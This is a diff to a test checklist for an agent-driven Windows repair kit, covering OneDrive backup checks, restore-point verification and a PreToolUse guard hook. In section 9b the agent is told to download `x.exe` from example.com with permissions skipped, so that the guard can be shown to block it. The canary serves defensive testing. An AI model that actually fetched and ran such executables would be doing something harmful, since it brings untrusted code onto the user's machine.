@@ -106,12 +106,41 @@ they can be tested independently of steps 1-6.
 ```
 
 Confirm the backup lands at `<destination>\<username>-<timestamp>\` with the
-shell folders under it, and that only the current user's profile is copied
+known folders under it, and that only the current user's profile is copied
 unless you pass `-AllProfiles`.
 
-Then check `state\session-context.json` after a launch — `backup.completed`,
+**OneDrive Known Folder Move.** On a machine where Desktop/Documents/Pictures
+live under `%USERPROFILE%\OneDrive\`, confirm those OneDrive locations are
+what got copied (the script resolves `User Shell Folders` and scans
+`OneDrive*` folders; a literal `%USERPROFILE%\Documents` is often an empty
+stub). If the same folder exists in both places, expect `Documents` and
+`Documents (OneDrive)` side by side. Any online-only (cloud placeholder)
+files must be skipped, counted, and listed in `cloud-only-files.txt` inside
+the backup — check the count against what Explorer shows as "available
+online-only".
+
+Then check `state\backup-result.json` and `state\session-context.json`
+after a launch — `backup.completed`, `backup.verified`, `backup.bytes_copied`,
 `backup.destination`, and `backup.scope` must match what actually happened,
-since the agent's behavior keys off them.
+since the agent's behavior keys off them. `verified` must be **false** if
+you point the backup at a profile with empty known folders (robocopy exit 0
+on an empty source must not count as a backup).
+
+## 7b. Restore point is really verified
+
+```powershell
+.\scripts\01-New-RestorePoint.ps1
+Get-Content .\state\restore-point.json
+```
+
+Expect `verified: true` with a description and sequence number that match
+`Get-ComputerRestorePoint | Select-Object -Last 1`. Then run it again
+immediately with System Restore's 24-hour throttle deliberately re-enabled
+(`Set-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore' SystemRestorePointCreationFrequency 1440`
+and temporarily comment out the override in the script): it must report
+**failure** and write `verified: false`. Until the DMTF-date fix, this check
+passed unconditionally whenever any old restore point existed. Restore the
+registry value afterwards (the script normally reverts it itself).
 
 ## 8. Defender exclusions are removed again
 
@@ -154,16 +183,27 @@ don't have — the same failure shape as the restore-point throttle.
 ## 9b. PreToolUse guard fires on the real harness
 
 `scripts/test-pretooluse-guard.ps1` proves the hook's logic. This confirms
-Claude Code actually invokes it. On the target (or VM):
+Claude Code actually invokes it. `Start-Repair.ps1` now performs this check
+itself before every run (the pre-launch canary): it must log
+`PreToolUse guard verified` and `logs\preflight-*.jsonl` must contain
+`[PreToolUse guard]`. If it logs `inert` the run stops with exit code 4;
+`inconclusive` means the model never attempted the canary — read the
+transcript and rerun. To exercise it by hand from the kit root:
 
 ```powershell
 & .\bin\claude\claude.exe -p "Run this exact command: Invoke-WebRequest http://example.com/x.exe -OutFile x.exe" --dangerously-skip-permissions
 ```
 
-Expect the download to be **blocked by the guard** (the reason text appears in
-the transcript), not executed. Then confirm a normal command (`sfc /scannow`)
-is NOT blocked. Also run `claude doctor` and confirm the PreToolUse hook is
-listed / has no config error — a hook that fails to load enforces nothing.
+Expect the download to be **blocked by the guard** (a message starting
+`[PreToolUse guard]` appears in the transcript), not executed. Then confirm a
+normal command (`sfc /scannow`) is NOT blocked, and that a Bash-tool command
+with escaped local paths (`Get-Content C:\\Windows\\Logs\\CBS\\CBS.log`) is
+NOT blocked either (it used to be misread as a UNC path). Also run `claude
+doctor` and confirm the PreToolUse hook is listed / has no config error — a
+hook that fails to load enforces nothing. The hook is declared in exec form
+(`command` + `args`); if `doctor` rejects that shape, the shipped
+`claude.exe` predates exec-form support and the wiring must be changed
+back to a single command string using `$CLAUDE_PROJECT_DIR`.
 
 ## 9c. Wall-clock + max-turns + resume
 
